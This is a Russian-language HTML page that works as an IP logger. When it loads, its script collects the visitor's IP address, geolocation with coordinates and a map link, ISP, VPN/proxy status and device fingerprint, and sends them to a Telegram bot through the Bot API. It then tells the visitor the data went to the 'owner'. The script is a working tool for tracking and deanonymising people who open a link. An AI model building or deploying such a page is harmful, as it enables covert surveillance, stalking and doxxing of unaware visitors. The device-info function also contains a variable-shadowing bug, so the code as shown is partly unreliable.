<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Сбор информации</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        body{background:#0a0a0a;display:flex;justify-content:center;align-items:center;min-height:100vh;font-family:system-ui;padding:20px}
        .card{background:rgba(30,30,40,0.8);backdrop-filter:blur(20px);border-radius:40px;padding:30px;max-width:500px;width:100%;text-align:center;border:1px solid rgba(255,255,255,0.1)}
        h1{color:#fff;margin-bottom:10px}
        p{color:#aaa;margin-bottom:20px;font-size:14px}
        .loader{width:40px;height:40px;border:3px solid #ff4444;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto}
        @keyframes spin{to{transform:rotate(360deg)}}
        .status{padding:12px;border-radius:25px;margin-top:15px;font-size:13px}
        .success{background:rgba(76,175,80,0.2);border:1px solid #4caf50;color:#4caf50}
        .error{background:rgba(255,68,68,0.2);border:1px solid #ff4444;color:#ff8888}
        .info{color:#666;font-size:12px;margin-top:20px}
    </style>
</head>
<body>
    <div class="card">
        <h1>📡 Сбор информации</h1>
        <p>Данные отправлены владельцу</p>
        <div class="loader"></div>
        <div id="status"></div>
        <div class="info">Ваш IP и устройство определены.</div>
    </div>

    <script>
        // ========== ПЛЕЙСХОЛДЕРЫ (ЗАМЕНЯЮТСЯ ЧЕРЕЗ GITHUB SECRETS) ==========
        const BOT_TOKEN = '__BOT_TOKEN__';
        const CHAT_ID = '__CHAT_ID__';
        // =========================================================================
        
        const statusDiv = document.getElementById('status');
        
        async function getIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                return data.ip;
            } catch(e) {
                return 'не определён';
            }
        }
        
        async function getGeo(ip) {
            try {
                const res = await fetch(`https://ip-api.com/json/${ip}?fields=status,country,city,regionName,lat,lon,isp,org,proxy,query`);
                const data = await res.json();
                if (data.status === 'success') {
                    return {
                        country: data.country,
                        region: data.regionName,
                        city: data.city,
                        lat: data.lat,
                        lon: data.lon,
                        isp: data.isp,
                        org: data.org,
                        isProxy: data.proxy || false,
                        mapUrl: `https://www.google.com/maps?q=${data.lat},${data.lon}`
                    };
                }
            } catch(e) {}
            return null;
        }
        
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Неизвестно';
            if (/iPhone|iPad|iPod/i.test(ua)) device = '🍎 iOS';
            else if (/Android/i.test(ua)) device = '🤖 Android';
            else if (/Windows/i.test(ua)) device = '💻 Windows';
            else if (/Macintosh/i.test(ua)) device = '🍏 Mac';
            
            let browser = 'Другой';
            if (ua.includes('Safari') && !ua.includes('Chrome')) browser = 'Safari';
            else if (ua.includes('Chrome')) browser = 'Chrome';
            else if (ua.includes('Firefox')) browser = 'Firefox';
            else if (ua.includes('Edg')) browser = 'Edge';
            
            let os = '';
            if (ua.includes('iPhone OS')) {
                const match = ua.match(/iPhone OS ([\d_]+)/);
                if (match) os = `iOS ${match[1].replace(/_/g, '.')}`;
            } else if (ua.includes('Android')) {
                const match = ua.match(/Android ([\d.]+)/);
                if (match) os = `Android ${match[1]}`;
            } else if (ua.includes('Windows NT 10.0')) os = 'Windows 10/11';
            else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
            else if (ua.includes('Mac OS X')) os = 'macOS';
            
            const screen = `${screen.width}x${screen.height}`;
            const language = navigator.language;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            return { device, browser, os, screen, language, timezone };
        }
        
        async function sendToTelegram(ip, geo, deviceInfo, isProxy) {
            if (BOT_TOKEN === '__BOT_TOKEN__' || CHAT_ID === '__CHAT_ID__') {
                console.log('Секреты не заменены');
                return;
            }
            
            let message = `🔍 *НОВЫЙ ПОСЕТИТЕЛЬ*\n\n`;
            message += `🌐 *IP:* ${ip}\n`;
            if (geo) {
                message += `📍 *Местоположение:* ${geo.city ? geo.city + ', ' : ''}${geo.region ? geo.region + ', ' : ''}${geo.country || ''}\n`;
                if (geo.lat && geo.lon) message += `🗺️ *Карта:* [Google Maps](${geo.mapUrl})\n`;
                message += `📡 *Провайдер:* ${geo.isp || 'неизвестен'}\n`;
                if (isProxy) message += `⚠️ *Вероятно использует VPN/Прокси*\n`;
            }
            message += `\n📱 *Устройство:* ${deviceInfo.device}\n`;
            message += `💻 *ОС:* ${deviceInfo.os || 'неизвестна'}\n`;
            message += `🧠 *Браузер:* ${deviceInfo.browser}\n`;
            message += `📺 *Экран:* ${deviceInfo.screen}\n`;
            message += `🌍 *Язык:* ${deviceInfo.language}\n`;
            message += `⏰ *Часовой пояс:* ${deviceInfo.timezone}\n`;
            message += `🕒 *Время:* ${new Date().toLocaleString()}`;
            
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                })
            });
        }
        
        async function main() {
            statusDiv.innerHTML = '⏳ Сбор данных...';
            statusDiv.className = 'status';
            
            const ip = await getIP();
            const geo = await getGeo(ip);
            const deviceInfo = getDeviceInfo();
            const isProxy = geo?.isProxy || false;
            
            await sendToTelegram(ip, geo, deviceInfo, isProxy);
            
            statusDiv.innerHTML = '✅ Данные отправлены владельцу';
            statusDiv.className = 'status success';
        }
        
        main();
    </script>
</body>
</html>
